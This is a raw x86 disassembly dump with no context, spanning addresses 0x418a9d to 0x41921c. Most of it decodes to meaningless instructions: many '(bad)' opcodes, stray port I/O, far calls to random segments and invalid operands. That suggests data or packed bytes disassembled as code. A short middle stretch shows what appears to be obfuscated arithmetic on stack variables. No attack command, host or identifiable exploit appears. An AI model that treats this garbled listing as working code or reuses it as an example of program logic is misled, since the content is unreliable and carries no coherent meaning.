  418a9d:	stos   BYTE PTR es:[edi],al
  418a9e:	pop    eax
  418a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aa0:	jecxz  0x418a26
  418aa2:	pusha  
  418aa3:	cmovge ebp,DWORD PTR [edx]
  418aa6:	mov    dl,BYTE PTR [edi+ebp*2]
  418aa9:	enter  0x1ce6,0xd8
  418aad:	inc    ebp
  418aae:	dec    ebx
  418aaf:	add    DWORD PTR [ebp-0x2695d3e8],ebp
  418ab5:	das    
  418ab6:	mov    ebx,0x6d6cb3c8
  418abb:	push   ds
  418abc:	mov    eax,ds:0x2bb51909
  418ac1:	cmp    DWORD PTR [ecx],ecx
  418ac3:	in     eax,0x59
  418ac5:	dec    edx
  418ac6:	jecxz  0x418a73
  418ac8:	scas   eax,DWORD PTR es:[edi]
  418ac9:	add    al,0x90
  418acb:	ficom  DWORD PTR [esi+edi*1+0x48]
  418acf:	mov    BYTE PTR [ecx+edi*1+0x307d80f2],ch
  418ad6:	loop   0x418abf
  418ad8:	sbb    eax,edx
  418ada:	adc    BYTE PTR [ecx-0x2f],al
  418add:	or     al,0xa4
  418adf:	shl    BYTE PTR [eax-0x7a],cl
  418ae2:	or     al,0x39
  418ae4:	aam    0x4e
  418ae6:	push   0x6f
  418ae8:	sbb    esi,DWORD PTR [edx+0x32]
  418aeb:	mov    dh,0x71
  418aed:	or     al,0xd6
  418aef:	pop    edx
  418af0:	call   0xdf26:0x40441d6c
  418af7:	add    esi,edi
  418af9:	ss adc eax,0xaf92facc
  418aff:	test   eax,0x2a4c9ab8
  418b04:	aam    0x60
  418b06:	sub    eax,0x2494ef5d
  418b0b:	pop    esi
  418b0c:	mov    eax,0x68437ad1
  418b11:	fs iret 
  418b13:	jle    0x418af5
  418b15:	fimul  WORD PTR [edx+eiz*2+0x3cc8a242]
  418b1c:	js     0x418b6a
  418b1e:	jle    0x418abd
  418b20:	jno    0x418b36
  418b22:	mov    BYTE PTR ds:0x49fd8491,dl
  418b28:	inc    ebx
  418b29:	loope  0x418b38
  418b2b:	cmc    
  418b2c:	nop
  418b2d:	cld    
  418b2e:	inc    ebp
  418b2f:	add    BYTE PTR [edx-0x34],ah
  418b32:	retf   0x3a79
  418b35:	push   edi
  418b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b37:	xchg   edi,eax
  418b38:	cmp    eax,0x299a01e5
  418b3d:	repnz or dh,dh
  418b40:	pop    ecx
  418b41:	stos   BYTE PTR es:[edi],al
  418b42:	div    BYTE PTR [edi]
  418b44:	je     0x418bac
  418b46:	pop    ds
  418b47:	mov    al,ds:0x7b005fb4
  418b4c:	inc    esp
  418b4d:	retf   
  418b4e:	aad    0x34
  418b50:	xchg   esi,eax
  418b51:	adc    al,0xf3
  418b53:	test   BYTE PTR [esi-0x52e2f582],dl
  418b59:	cmp    eax,0x74a3d5e0
  418b5e:	in     al,0xe2
  418b60:	lods   eax,DWORD PTR ds:[esi]
  418b61:	jne    0x418ba2
  418b63:	and    BYTE PTR [ebx-0x36],bh
  418b66:	loopne 0x418bcf
  418b68:	ret    
  418b69:	fild   DWORD PTR [eax-0x232c3f8a]
  418b6f:	push   esp
  418b70:	push   0x2d75aabd
  418b75:	sar    BYTE PTR [edx-0x3fddace9],1
  418b7b:	enter  0xbde4,0x70
  418b7f:	sahf   
  418b80:	call   0x35a8:0x3891514a
  418b87:	imul   eax,eax,0xeeab3e90
  418b8d:	adc    al,bh
  418b8f:	lods   al,BYTE PTR ds:[esi]
  418b90:	pushf  
  418b91:	adc    al,0x41
  418b93:	sub    ebp,DWORD PTR [eax+0x4d39f95d]
  418b99:	adc    DWORD PTR [esi],eax
  418b9b:	ret    0x670c
  418b9e:	lahf   
  418b9f:	inc    edi
  418ba0:	sub    DWORD PTR [esi],0x35
  418ba3:	pop    ebx
  418ba4:	es das 
  418ba6:	leave  
  418ba7:	jmp    0xd7453180
  418bac:	mov    eax,DWORD PTR [ebp-0x5d]
  418baf:	addr16 (bad) 
  418bb2:	out    0x6b,eax
  418bb4:	mov    esi,0xe3e8bc93
  418bb9:	mov    al,0xec
  418bbb:	or     BYTE PTR gs:0x885bc078,al
  418bc2:	cmp    BYTE PTR [ebx+0x1b],0xca
  418bc6:	push   edx
  418bc7:	sahf   
  418bc8:	stos   DWORD PTR es:[edi],eax
  418bc9:	inc    esi
  418bca:	xchg   edi,eax
  418bcb:	fist   DWORD PTR [eax]
  418bcd:	inc    eax
  418bce:	scas   eax,DWORD PTR es:[edi]
  418bcf:	lods   al,BYTE PTR ds:[esi]
  418bd0:	inc    edx
  418bd1:	push   edx
  418bd2:	mov    fs,ebp
  418bd4:	scas   eax,DWORD PTR es:[edi]
  418bd5:	scas   eax,DWORD PTR es:[edi]
  418bd6:	push   0xe1d854cf
  418bdb:	call   0x876e:0x73cc2481
  418be2:	push   esi
  418be3:	fs ret 0x49a7
  418be7:	xchg   ecx,eax
  418be8:	(bad)  
  418be9:	stc    
  418bea:	stos   BYTE PTR es:[edi],al
  418beb:	jo     0x418c0d
  418bed:	and    BYTE PTR [edx],0x2e
  418bf0:	jl     0x418c15
  418bf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bf3:	fstp   DWORD PTR [esi-0x8]
  418bf6:	repz dec ebp
  418bf8:	pop    esi
  418bf9:	jg     0x418bed
  418bfb:	sub    ecx,DWORD PTR [edx-0x24]
  418bfe:	out    0xec,eax
  418c00:	test   BYTE PTR [ebx-0x791142ab],dl
  418c06:	dec    ebx
  418c07:	push   esp
  418c08:	fild   DWORD PTR [eax+ecx*2+0x26]
  418c0c:	push   ds
  418c0d:	sub    eax,0x5a7142fc
  418c12:	stc    
  418c13:	bswap  ebp
  418c15:	mov    eax,ds:0xcdf64e48
  418c1a:	into   
  418c1b:	in     al,0xe9
  418c1d:	mov    WORD PTR [ecx+0x36],?
  418c20:	push   es
  418c21:	leave  
  418c22:	inc    ecx
  418c23:	cld    
  418c24:	stos   DWORD PTR es:[edi],eax
  418c25:	jle    0x418bbf
  418c27:	aad    0x85
  418c29:	enter  0x39ff,0xc6
  418c2d:	out    dx,eax
  418c2e:	es push edx
  418c30:	loopne 0x418c3b
  418c32:	fs stos BYTE PTR es:[edi],al
  418c34:	inc    ecx
  418c35:	(bad)  
  418c36:	retf   
  418c37:	push   es
  418c38:	outs   dx,DWORD PTR ds:[esi]
  418c39:	outs   dx,BYTE PTR ds:[esi]
  418c3a:	mov    edx,0x58491980
  418c3f:	mov    bl,0x5b
  418c41:	mov    eax,0xd7b25bef
  418c46:	lods   al,BYTE PTR ds:[esi]
  418c47:	add    al,BYTE PTR [ebp-0x3329cc8d]
  418c4d:	js     0x418c47
  418c4f:	xchg   esi,eax
  418c50:	mov    ebp,edi
  418c52:	rcr    BYTE PTR [ecx+0x10],cl
  418c55:	lods   al,BYTE PTR ds:[esi]
  418c56:	mov    al,ds:0xcc98b092
  418c5b:	sub    eax,0x6982c044
  418c60:	dec    esp
  418c61:	fwait
  418c62:	je     0x418cd5
  418c64:	add    BYTE PTR [ecx+0x391439f2],ch
  418c6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c6b:	mov    ds:0x4501754d,al
  418c70:	mov    esi,0x82209ab2
  418c75:	retf   
  418c76:	adc    eax,DWORD PTR [ecx]
  418c78:	(bad)  
  418c79:	xchg   ebx,eax
  418c7a:	mov    cl,BYTE PTR [ecx+0x1e]
  418c7d:	test   eax,0x72bbf726
  418c82:	mov    ebx,0xa3c4000b
  418c87:	gs xchg ecx,eax
  418c89:	jmp    0x418ca1
  418c8b:	adc    ch,BYTE PTR [ecx-0x6550c3c9]
  418c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c92:	push   eax
  418c93:	shl    BYTE PTR [edx-0xe633050],1
  418c99:	scas   eax,DWORD PTR es:[edi]
  418c9a:	into   
  418c9b:	out    dx,eax
  418c9c:	int3   
  418c9d:	pushf  
  418c9e:	pop    edx
  418c9f:	jo     0x418c52
  418ca1:	push   0x1f4d0534
  418ca6:	sbb    cl,dh
  418ca8:	dec    ecx
  418ca9:	and    al,0x4e
  418cab:	fimul  WORD PTR [edx-0x1c988fd1]
  418cb1:	pop    ds
  418cb2:	cmp    BYTE PTR [esi],bl
  418cb4:	enter  0xa4a5,0x3a
  418cb8:	test   DWORD PTR [ebx-0x34993c21],edx
  418cbe:	mov    ch,0xdf
  418cc0:	cld    
  418cc1:	dec    esi
  418cc2:	sbb    BYTE PTR [ebp+0x42],bl
  418cc5:	pop    ebp
  418cc6:	inc    esi
  418cc7:	sub    BYTE PTR [edi-0x2a],bh
  418cca:	jns    0x418cad
  418ccc:	push   0xa5e30d3d
  418cd1:	jecxz  0x418cd0
  418cd3:	leave  
  418cd4:	pop    esi
  418cd5:	inc    esi
  418cd6:	dec    esi
  418cd7:	shl    DWORD PTR [edi+ecx*8-0x1055a98],cl
  418cde:	or     DWORD PTR [edi],esi
  418ce0:	xchg   ebx,eax
  418ce1:	(bad)  
  418ce2:	jo     0x418c8b
  418ce4:	dec    edx
  418ce6:	xor    DWORD PTR [ecx+0x64],esi
  418ce9:	mov    cs:0x36262fd9,eax
  418cef:	rcl    ebx,0xa9
  418cf2:	loopne 0x418d0d
  418cf4:	mov    dl,0xed
  418cf6:	xchg   edi,eax
  418cf7:	dec    esp
  418cf8:	fisttp WORD PTR [esi]
  418cfa:	cs mov esp,0x260a92f9
  418d00:	pop    ds
  418d01:	imul   edx,DWORD PTR [edi+esi*4+0x67],0x6188f5af
  418d09:	and    eax,0xd6af62d3
  418d0e:	adc    al,0xaa
  418d10:	cwde   
  418d11:	test   al,0x57
  418d13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d14:	lods   al,BYTE PTR ds:[esi]
  418d15:	call   0x2a7d2459
  418d1a:	retf   
  418d1b:	in     eax,0xcd
  418d1d:	xchg   ecx,eax
  418d1e:	call   0xce6b:0xaa438e7b
  418d25:	aas    
  418d26:	mov    dl,0x9e
  418d28:	iret   
  418d29:	inc    edx
  418d2a:	xor    ch,BYTE PTR [esi]
  418d2c:	sbb    eax,0x580d8a61
  418d31:	xchg   edi,eax
  418d32:	pop    ebx
  418d33:	or     ecx,ecx
  418d35:	std    
  418d36:	pushf  
  418d37:	lods   eax,DWORD PTR ds:[esi]
  418d38:	(bad)  
  418d39:	js     0x418d9d
  418d3b:	outs   dx,BYTE PTR ds:[esi]
  418d3c:	mov    dl,0xc1
  418d3e:	inc    esp
  418d3f:	pop    esi
  418d40:	lahf   
  418d41:	call   DWORD PTR [ebx]
  418d43:	jge    0x418d13
  418d45:	das    
  418d46:	adc    DWORD PTR [edx+0x4],esp
  418d49:	jb     0x418da4
  418d4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d4c:	retf   
  418d4d:	fs sub dl,ah
  418d50:	jae    0x418d9e
  418d52:	fwait
  418d53:	in     eax,0xee
  418d55:	sar    DWORD PTR [ebx],0x23
  418d58:	xchg   ecx,eax
  418d59:	repz call 0x566e90ad
  418d5f:	xchg   esp,eax
  418d60:	in     eax,dx
  418d61:	push   ds
  418d62:	outs   dx,BYTE PTR ds:[esi]
  418d63:	mov    eax,0xbd930068
  418d68:	xor    dh,BYTE PTR [eax-0x35]
  418d6b:	jge    0x418d9b
  418d6d:	pop    edx
  418d6e:	dec    ecx
  418d6f:	fs int 0x45
  418d72:	sbb    al,0x63
  418d74:	xor    dh,bl
  418d76:	add    BYTE PTR [edi+eiz*2],0x39
  418d7a:	es out 0x13,al
  418d7d:	xor    dh,ah
  418d7f:	rol    DWORD PTR [ebp+edi*8+0x3c2d067a],cl
  418d86:	gs adc eax,0x2c3b3a38
  418d8c:	data16 and bl,BYTE PTR [ecx]
  418d8f:	sub    eax,0x6c49d175
  418d94:	sahf   
  418d95:	ins    BYTE PTR es:[edi],dx
  418d96:	cmp    BYTE PTR [eax],ch
  418d98:	push   eax
  418d99:	mov    DWORD PTR [esi],ebp
  418d9b:	lahf   
  418d9c:	mov    ds,WORD PTR [esp+0x3f0174b8]
  418da3:	fld    st(2)
  418da5:	and    dl,BYTE PTR [esi]
  418da7:	or     DWORD PTR [edi],edi
  418da9:	push   ebp
  418daa:	sbb    BYTE PTR [eax],cl
  418dac:	div    DWORD PTR [ebp+0x406ebb66]
  418db2:	push   ebx
  418db3:	fstp   QWORD PTR [esp+0x5c5f04a2]
  418dba:	(bad)  
  418dbb:	fmul   st,st(2)
  418dbd:	into   
  418dbe:	cmp    al,0xc5
  418dc0:	cmp    cl,BYTE PTR [ebx-0x2a]
  418dc3:	inc    edi
  418dc4:	mov    ecx,edx
  418dc6:	(bad)  
  418dc7:	in     al,dx
  418dc8:	je     0x418db1
  418dca:	push   edi
  418dcb:	or     cl,bh
  418dcd:	and    eax,0x3076d094
  418dd2:	(bad)  
  418dd3:	or     bl,BYTE PTR [eax*1-0x7af5fa03]
  418dda:	adc    BYTE PTR [edi+edi*1-0x61],0xb5
  418ddf:	pop    esi
  418de0:	aam    0x8d
  418de2:	repnz dec esi
  418de4:	test   edi,esi
  418de6:	mov    ecx,0xe45a79a5
  418deb:	adc    DWORD PTR [ebx+edi*1-0x5a],eax
  418def:	cwde   
  418df0:	ret    0x707b
  418df3:	rol    BYTE PTR [esi],cl
  418df5:	test   bl,0xca
  418df8:	inc    ebx
  418df9:	push   eax
  418dfa:	jle    0x418e1a
  418dfc:	lods   eax,DWORD PTR ds:[esi]
  418dfd:	daa    
  418dfe:	cvttps2pi mm7,QWORD PTR [ecx]
  418e01:	pop    edi
  418e02:	and    eax,0x4ff5f4c4
  418e07:	mov    WORD PTR [edi-0x563f1b97],?
  418e0d:	ss pop eax
  418e0f:	mov    eax,ds:0x12a516a8
  418e14:	jne    0x418e57
  418e16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e17:	sahf   
  418e18:	stos   DWORD PTR es:[edi],eax
  418e19:	inc    ecx
  418e1a:	std    
  418e1b:	dec    edx
  418e1c:	pop    ds
  418e1d:	neg    DWORD PTR [eax]
  418e1f:	lock dec edx
  418e22:	inc    esi
  418e23:	xchg   ebp,eax
  418e24:	jmp    0x418e01
  418e26:	adc    bl,BYTE PTR [eax-0x77d9ff53]
  418e2c:	stos   BYTE PTR es:[edi],al
  418e2d:	daa    
  418e2e:	loopne 0x418e21
  418e30:	dec    ebp
  418e31:	cmp    dl,dh
  418e33:	inc    ecx
  418e34:	jno    0x418e02
  418e36:	mov    cl,0x31
  418e38:	ds jb  0x418dda
  418e3b:	popf   
  418e3c:	inc    ecx
  418e3d:	inc    esp
  418e3e:	push   edi
  418e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e40:	aaa    
  418e41:	add    ebp,DWORD PTR [eax]
  418e43:	or     al,0x1e
  418e45:	rcr    BYTE PTR [ebp+esi*4+0x1278b61b],0xb7
  418e4d:	dec    ebx
  418e4e:	loope  0x418ea8
  418e50:	and    eax,0xe4260123
  418e55:	or     ebx,edi
  418e57:	ins    DWORD PTR es:[edi],dx
  418e58:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e5a:	or     al,0x4a
  418e5c:	mov    edx,0x16a71996
  418e61:	cmp    al,0x86
  418e63:	stos   BYTE PTR es:[edi],al
  418e64:	adc    dl,bl
  418e66:	jl     0x418e4a
  418e68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e69:	xor    al,0x43
  418e6b:	dec    edx
  418e6c:	push   eax
  418e6d:	shl    al,cl
  418e6f:	push   esp
  418e70:	xor    DWORD PTR [edx],edi
  418e72:	cmp    DWORD PTR [edx-0x26],edx
  418e75:	push   esi
  418e76:	lds    ebp,FWORD PTR [ebx]
  418e78:	dec    ecx
  418e79:	cdq    
  418e7a:	adc    ebp,eax
  418e7c:	pop    edx
  418e7d:	cmp    esi,0x12
  418e80:	and    BYTE PTR [eax],0xde
  418e83:	mov    ch,0x36
  418e85:	nop
  418e86:	jno    0x418ec3
  418e88:	xor    esi,DWORD PTR [ecx+edi*8+0x96496fa]
  418e8f:	bound  eax,QWORD PTR [esi+0x1e]
  418e92:	fsubr  QWORD PTR [ecx-0x72]
  418e95:	ret    0x221c
  418e98:	jg     0x418e6b
  418e9a:	mov    ds:0x8d8231ba,eax
  418e9f:	je     0x418e5d
  418ea1:	mov    ebx,0xc41dda7
  418ea6:	call   DWORD PTR [eax+0x2a6ee0bd]
  418eac:	adc    DWORD PTR [edx],edi
  418eae:	jns    0x418ef1
  418eb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418eb1:	(bad)  
  418eb3:	sub    ecx,DWORD PTR ds:0xa9e98a54
  418eb9:	fmul   st(5),st
  418ebb:	sbb    cl,cl
  418ebd:	fistp  DWORD PTR [eax-0x61]
  418ec0:	fcom   DWORD PTR [eax+0x1308a9d]
  418ec6:	outs   dx,DWORD PTR ds:[esi]
  418ec7:	rcl    BYTE PTR [ecx+0x35557914],cl
  418ecd:	retf   0x21f2
  418ed0:	push   eax
  418ed1:	mov    eax,0x6290014c
  418ed6:	sub    DWORD PTR [esi+0xe4f80c4],0x39
  418edd:	loope  0x418e7a
  418edf:	sbb    DWORD PTR [esi],esp
  418ee1:	(bad)  
  418ee4:	cmp    DWORD PTR [edi+0x4e503e37],ebp
  418eea:	js     0x418ebb
  418eec:	cld    
  418eed:	iret   
  418eee:	jecxz  0x418ed7
  418ef0:	cmp    DWORD PTR [ecx+edx*8+0x2abcb17c],esi
  418ef7:	pop    ebp
  418ef8:	iret   
  418ef9:	nop
  418efa:	push   edi
  418efb:	adc    DWORD PTR [edx],ebp
  418efd:	stos   DWORD PTR es:[edi],eax
  418efe:	popf   
  418eff:	mov    ebp,DWORD PTR es:0x266e9901
  418f06:	cmp    al,0x44
  418f08:	jns    0x418ef8
  418f0a:	adc    al,0xd7
  418f0c:	out    0xec,al
  418f0e:	or     DWORD PTR [ebx],ebp
  418f10:	push   ebp
  418f11:	xor    eax,0xc9d489c5
  418f16:	psubusb mm1,mm4
  418f19:	dec    eax
  418f1a:	xor    ah,BYTE PTR [ecx-0x566010df]
  418f20:	inc    ebp
  418f21:	add    eax,0x1762b800
  418f26:	sar    DWORD PTR [esi],1
  418f28:	outs   dx,DWORD PTR ds:[esi]
  418f29:	cmp    edx,ebx
  418f2b:	imul   ebp,DWORD PTR [ebp+0x2b],0x75
  418f2f:	xor    DWORD PTR [ecx+ebx*8-0x7babdd18],esp
  418f36:	imul   ecx,DWORD PTR [edi],0x2f
  418f39:	mov    al,ds:0xfd5cda36
  418f3e:	sbb    dh,BYTE PTR [ebx-0x51f2c522]
  418f44:	sbb    BYTE PTR [eax],dh
  418f46:	call   0x2353:0xfdd1a910
  418f4d:	mov    edx,0x11a7cc5
  418f52:	sti    
  418f53:	bnd jbe 0x418f8f
  418f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f57:	or     al,0x39
  418f59:	and    DWORD PTR ds:0x668d275c,0x9
  418f60:	inc    esi
  418f61:	shl    DWORD PTR [esi],cl
  418f63:	inc    edi
  418f64:	sub    ecx,esi
  418f66:	sub    edi,DWORD PTR [edx+0x2]
  418f69:	jbe    0x418f0a
  418f6b:	sti    
  418f6c:	pop    ecx
  418f6d:	(bad)  
  418f6e:	push   ebx
  418f6f:	lahf   
  418f70:	dec    ebx
  418f71:	or     cl,0x36
  418f74:	mov    cl,BYTE PTR [ecx+esi*8+0x4c]
  418f78:	leave  
  418f79:	ret    0xb244
  418f7c:	sub    eax,0xf7aeede6
  418f81:	mov    cl,0x55
  418f83:	lods   al,BYTE PTR ds:[esi]
  418f84:	enter  0xeb19,0xf
  418f88:	jle    0x418f80
  418f8a:	in     al,0x97
  418f8c:	jb     0x419008
  418f8e:	mov    edi,0x70096131
  418f93:	inc    esp
  418f94:	xchg   DWORD PTR [ebp-0x335e37c2],ecx
  418f9a:	mov    al,0xfa
  418f9c:	cld    
  418f9d:	mov    edx,0x6362c511
  418fa2:	ja     0x418ffd
  418fa4:	cmp    BYTE PTR [ebx-0x79],dh
  418fa7:	jnp    0x418fcb
  418fa9:	mov    es,edx
  418fab:	jmp    0xcbe6bd9a
  418fb0:	test   BYTE PTR [ebx],0xb2
  418fb3:	rcr    BYTE PTR [eax+0xe],1
  418fb6:	js     0x418f6a
  418fb8:	ror    DWORD PTR [ebp+0x4f47ef07],1
  418fbe:	xor    al,dh
  418fc0:	mov    esi,0x4dc9844e
  418fc5:	xchg   esi,eax
  418fc6:	and    eax,0x8f7f0b33
  418fcb:	(bad)  
  418fcc:	sub    al,0x8
  418fce:	push   ds
  418fcf:	icebp  
  418fd0:	loopne 0x418f9c
  418fd2:	xchg   edi,eax
  418fd3:	push   ss
  418fd4:	jns    0x419046
  418fd6:	iret   
  418fd7:	mov    ah,0x5a
  418fd9:	jnp    0x418f88
  418fdb:	sub    BYTE PTR [ecx+0x68e83924],bl
  418fe1:	(bad)  
  418fe2:	int    0xd1
  418fe4:	mov    ebp,DWORD PTR [ecx-0x721b647c]
  418fea:	sub    edi,DWORD PTR [esi+ebx*2-0x1f18f8ad]
  418ff1:	int    0x2b
  418ff3:	js     0x419032
  418ff5:	aam    0xa5
  418ff7:	and    al,0xd0
  418ff9:	sub    BYTE PTR [ecx-0x72c16cf1],0xcc
  419000:	sahf   
  419001:	push   esp
  419002:	jl     0x419010
  419004:	aad    0xd
  419006:	sbb    al,0xe7
  419008:	(bad)
  41900b:	add    al,0xc2
  41900d:	repz scas eax,DWORD PTR es:[edi]
  41900f:	nop
  419010:	xchg   BYTE PTR [ecx-0x78],dh
  419013:	push   eax
  419014:	mov    bl,ch
  419016:	inc    esp
  419017:	xor    ebx,DWORD PTR [eax+edx*8]
  41901a:	pop    ebx
  41901b:	pop    edx
  41901c:	jle    0x41900d
  41901e:	mov    eax,0xf33afb1d
  419023:	adc    DWORD PTR [ebp-0x45],0x6ac7f5dd
  41902a:	sub    eax,0xdd66fe0a
  41902f:	xor    ch,BYTE PTR ds:0x73d2fd23
  419035:	lods   al,BYTE PTR ds:[esi]
  419036:	jnp    0x418fc9
  419038:	nop
  419039:	cmp    ah,dh
  41903b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41903c:	int    0x62
  41903e:	xchg   BYTE PTR [edx],al
  419040:	loopne 0x4190a6
  419042:	pop    eax
  419043:	adc    DWORD PTR [edx-0x798e6873],ecx
  419049:	psubq  mm7,QWORD PTR [ecx+0x1e]
  41904d:	adc    cl,0x14
  419050:	je     0x419052
  419052:	shr    al,0xea
  419055:	cmp    ah,BYTE PTR [eax]
  419057:	imul   edi,DWORD PTR [eax-0x66fd751f],0x7
  41905e:	inc    esp
  41905f:	and    eax,0x53db9a01
  419064:	shl    esp,0xd4
  419067:	jae    0x4190a6
  419069:	or     ch,BYTE PTR ds:0x64ee801b
  41906f:	add    DWORD PTR [esi],edx
  419071:	add    DWORD PTR [ecx+esi*1],esi
  419074:	sbb    ecx,ebx
  419076:	or     al,0x5e
  419078:	and    ebp,DWORD PTR [edx]
  41907a:	pop    eax
  41907b:	push   ecx
  41907c:	dec    ebp
  41907d:	mov    edi,0x319c926f
  419082:	icebp  
  419083:	cwde   
  419084:	jns    0x4190fe
  419086:	pop    es
  419087:	mov    bh,bh
  419089:	adc    ebx,DWORD PTR [edx-0x77]
  41908c:	jge    0x4190b7
  41908e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41908f:	sahf   
  419090:	dec    esp
  419091:	dec    eax
  419092:	push   esp
  419093:	ins    DWORD PTR es:[edi],dx
  419094:	(bad)  
  419095:	xchg   esi,eax
  419096:	imul   esp,DWORD PTR [ebp-0x56],0xffffffb4
  41909a:	add    edx,DWORD PTR [eax-0x1e]
  41909d:	sbb    DWORD PTR [ebp-0x7fe95685],edx
  4190a3:	daa    
  4190a4:	(bad)  
  4190a5:	int3   
  4190a6:	and    eax,0x95fa167e
  4190ab:	enter  0x1654,0xa9
  4190af:	ins    DWORD PTR es:[edi],dx
  4190b0:	pop    esi
  4190b1:	xchg   BYTE PTR [ecx],ch
  4190b3:	add    eax,0x6b25a76f
  4190b8:	push   ebp
  4190b9:	and    al,0x72
  4190bb:	mov    DWORD PTR ds:0x5c4e3bbc,eax
  4190c1:	loope  0x4190a0
  4190c3:	sub    BYTE PTR [edi],0x96
  4190c6:	(bad)  
  4190c7:	in     eax,dx
  4190c8:	cld    
  4190c9:	push   ebp
  4190ca:	jb     0x4190da
  4190cc:	add    al,0x21
  4190ce:	sar    dh,cl
  4190d0:	sub    BYTE PTR [ebx+0x36],ah
  4190d3:	scas   al,BYTE PTR es:[edi]
  4190d4:	test   ebp,esp
  4190d6:	call   0x7bf9e6cb
  4190db:	in     eax,0x40
  4190dd:	cmc    
  4190de:	retf   
  4190df:	call   FWORD PTR [edi]
  4190e1:	popf   
  4190e2:	xor    DWORD PTR [esi+0x4e],edx
  4190e5:	dec    esi
  4190e6:	std    
  4190e7:	fnstcw WORD PTR [eax-0x3db5c895]
  4190ed:	cmp    al,0x6
  4190ef:	sbb    esi,eax
  4190f1:	sti    
  4190f2:	rcl    DWORD PTR [edx],cl
  4190f4:	sbb    DWORD PTR [edx],edx
  4190f6:	cwde   
  4190f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190f8:	js     0x4190f5
  4190fa:	stc    
  4190fb:	and    ah,BYTE PTR [ecx-0x4a21569]
  419101:	data16 mov al,0xc7
  419104:	je     0x41913f
  419106:	ins    DWORD PTR es:[edi],dx
  419107:	dec    edi
  419108:	inc    ecx
  419109:	inc    eax
  41910a:	es nop
  41910c:	cli    
  41910d:	inc    edi
  41910e:	or     BYTE PTR [edx+0x45],0x29
  419112:	mov    ds:0x4de3143f,al
  419117:	push   edx
  419118:	pop    eax
  419119:	test   DWORD PTR [eax-0x3a],esi
  41911c:	popa   
  41911d:	cmp    al,0x69
  41911f:	sub    esi,ebx
  419121:	ins    BYTE PTR es:[edi],dx
  419122:	jns    0x419182
  419124:	pop    ds
  419125:	in     eax,dx
  419126:	pushf  
  419127:	fstp   TBYTE PTR [ebx+0xc84b4af]
  41912d:	out    dx,al
  41912e:	push   eax
  41912f:	out    dx,eax
  419130:	shl    BYTE PTR [ecx+0x5a],0x25
  419134:	push   esp
  419135:	mov    ch,0xc5
  419137:	adc    BYTE PTR [ecx+0x71],ah
  41913a:	aad    0xe5
  41913c:	sub    DWORD PTR [edx+0x8],edi
  41913f:	cmp    al,0x1c
  419141:	jl     0x4190cc
  419143:	push   ebp
  419144:	mov    al,0x8b
  419146:	push   ebp
  419147:	or     BYTE PTR [ebx-0x28fc4ba3],cl
  41914d:	and    edx,ebx
  41914f:	mov    DWORD PTR [ebp-0x4c],edx
  419152:	mov    edx,DWORD PTR [ebp+0x8]
  419155:	mov    ebx,DWORD PTR [ebp-0x48]
  419158:	lea    edx,[ebx+edx*1+0x241fcdf]
  41915f:	mov    DWORD PTR [ebp-0x48],edx
  419162:	mov    edx,DWORD PTR [ebp+0x8]
  419165:	mov    ebx,0xfa5e1524
  41916a:	sub    ebx,edx
  41916c:	add    ebx,DWORD PTR [ebp-0x44]
  41916f:	mov    DWORD PTR [ebp-0x44],ebx
  419172:	mov    edx,DWORD PTR [ebp+0x8]
  419175:	xor    edx,eax
  419177:	add    edx,esi
  419179:	jne    0x416da2
  41917f:	mov    edx,DWORD PTR [ebp-0x8]
  419182:	mov    ebx,DWORD PTR [ebp-0xc]
  419185:	xor    edx,eax
  419187:	lea    edx,[edx+ebx*1+0x3272f5]
  41918e:	mov    DWORD PTR [ebp-0xc],edx
  419191:	mov    edx,DWORD PTR [ebp-0x10]
  419194:	xor    edx,eax
  419196:	add    edx,esi
  419198:	jne    0x4124bd
  41919e:	jmp    0x41b615
  4191a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4191a6:	mov    DWORD PTR [ebp+0x8],ecx
  4191a9:	jmp    0x41b582
  4191ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4191b1:	mov    edx,DWORD PTR [ebp-0x8]
  4191b4:	xor    ecx,eax
  4191b6:	xor    edx,eax
  4191b8:	sub    ecx,edx
  4191ba:	sub    ecx,esi
  4191bc:	xor    ecx,eax
  4191be:	mov    DWORD PTR [ebp+0x8],ecx
  4191c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4191c4:	mov    edx,DWORD PTR [ebp-0x58]
  4191c7:	add    ecx,0x5708e2
  4191cd:	imul   ecx,edx
  4191d0:	mov    DWORD PTR [ebp-0x58],ecx
  4191d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4191d6:	mov    edx,DWORD PTR [ebp-0x54]
  4191d9:	add    ecx,0x64f880
  4191df:	or     ecx,edx
  4191e1:	mov    DWORD PTR [ebp-0x54],ecx
  4191e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4191e7:	mov    edx,DWORD PTR [ebp-0x50]
  4191ea:	add    ecx,0x242ebf1
  4191f0:	xor    ecx,edx
  4191f2:	mov    DWORD PTR [ebp-0x50],ecx
  4191f5:	jmp    0x41b555
  4191fa:	pop    edx
  4191fb:	cmp    al,0xf8
  4191fd:	inc    esp
  4191fe:	xchg   esi,eax
  4191ff:	test   dl,cl
  419201:	and    al,BYTE PTR [edx+0xaf7278c]
  419207:	mov    dl,bh
  419209:	xlat   BYTE PTR ds:[ebx]
  41920a:	xor    esp,DWORD PTR [eax]
  41920c:	add    BYTE PTR [ebx-0x7c7ca1c2],0x2f
  419213:	fstp   QWORD PTR [ecx]
  419215:	jecxz  0x4191a0
  419217:	sub    BYTE PTR [ecx+0x16],dh
  41921a:	mov    esi,DWORD PTR [esi]
  41921c:	inc    edx
